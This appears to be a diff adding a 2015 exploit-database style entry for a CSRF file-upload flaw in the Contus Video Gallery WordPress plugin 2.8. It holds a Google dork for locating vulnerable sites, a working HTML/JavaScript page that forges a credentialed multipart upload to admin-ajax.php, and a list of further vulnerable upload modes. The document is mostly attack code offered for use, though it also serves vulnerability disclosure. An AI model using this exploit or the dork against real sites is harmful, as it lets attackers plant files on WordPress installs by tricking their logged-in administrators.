@@ -1,0 +1,61 @@
+# Exploit Title: Wordpress Video Gallery Plugin Multiple CSRF File Upload
+# Google Dork: inurl:/wp-content/plugins/contus-video-gallery
+# Date: 31 March 2015
+# Exploit Author: Divya
+# Vendor Homepage: https://wordpress.org/plugins/contus-video-gallery/
+# Software Link: https://downloads.wordpress.org/plugin/contus-video-gallery.2.8.zip
+# Version: 2.8
+# Tested on: Windows, Linux
+# CVE : None
+
+CSRF File Upload Exploit Code:
+
+<html>
+<head>
+<title>
+WP Plugin CSRF File Upload
+</title>
+<body>
+	<script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://192.168.1.2/wp-admin/admin-ajax.php?action=uploadvideo", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------103932797413649");
+        xhr.withCredentials = true;
+        var body = "-----------------------------103932797413649\r\n" + 
+          "Content-Disposition: form-data; name=\"myfile\"; filename=\"test.mp4\"\r\n" + 
+          "Content-Type: video/mp4\r\n" + 
+          "\r\n" + 
+          "hello world how are you\r\n" + 
+          "-----------------------------103932797413649\r\n" + 
+          "Content-Disposition: form-data; name=\"mode\"\r\n" + 
+          "\r\n" + 
+          "video\r\n" + 
+          "-----------------------------103932797413649--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit" onclick="submitRequest();" />
+    </form>
+
+	
+  </body>
+</html>
+
+
+Other CSRF vulnerable areas of application:
+URL: http://192.168.1.2/wp-admin/admin-ajax.php?action=uploadvideo
+Data: myfile=[upload_file_details]&mode=video
+
+URL: http://192.168.1.2/wp-admin/admin-ajax.php?action=uploadvideo
+Data: myfile=[upload_file_details]&mode=image
+
+URL: http://192.168.1.2/wp-admin/admin-ajax.php?action=uploadvideo
+Data: myfile=[upload_file_details]&mode=srt
